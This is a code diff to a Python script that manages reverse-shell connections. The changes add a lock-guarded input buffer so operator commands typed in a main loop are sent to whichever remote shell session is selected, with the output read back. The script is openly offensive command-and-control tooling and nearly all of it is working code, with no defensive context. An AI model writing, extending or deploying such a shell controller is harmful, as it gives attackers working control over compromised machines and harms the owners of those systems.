@@ -6,6 +6,7 @@ import select
 
 thread_stdin_lock = threading.Lock()
 thread_stdin_target = 0
+thread_stdin_buffer = ""
 
 def non_blocking_input(timeout=0.1):
     if select.select([sys.stdin], [], [], timeout)[0]:
@@ -24,13 +25,19 @@ def reverse_shell_connection(ip: str, port: int, id: int):
     output = conn.recv(1024).decode()
 
     while True:
-        in_focus = True
+        in_focus = False
         with thread_stdin_lock:
             in_focus = thread_stdin_target == id
 
         if in_focus:
-            cmd = non_blocking_input()
-            if cmd is not None:
+            cmd = ""
+
+            with thread_stdin_lock:
+                global thread_stdin_buffer
+                cmd = thread_stdin_buffer
+                thread_stdin_buffer = ""
+
+            if cmd != "":
                 conn.send(cmd.encode() + b"\n")
                 time.sleep(0.5)
                 output = conn.recv(1024).decode()
@@ -42,6 +49,16 @@ t.start()
 input("Press wahtever to join the thread")
 with thread_stdin_lock:
     thread_stdin_target = 1
+
+while True:
+    c = non_blocking_input()
+    if c:
+        with thread_stdin_lock:
+            thread_stdin_buffer = c
+
+    time.sleep(0.1)
+
+
 
 t.join()
 
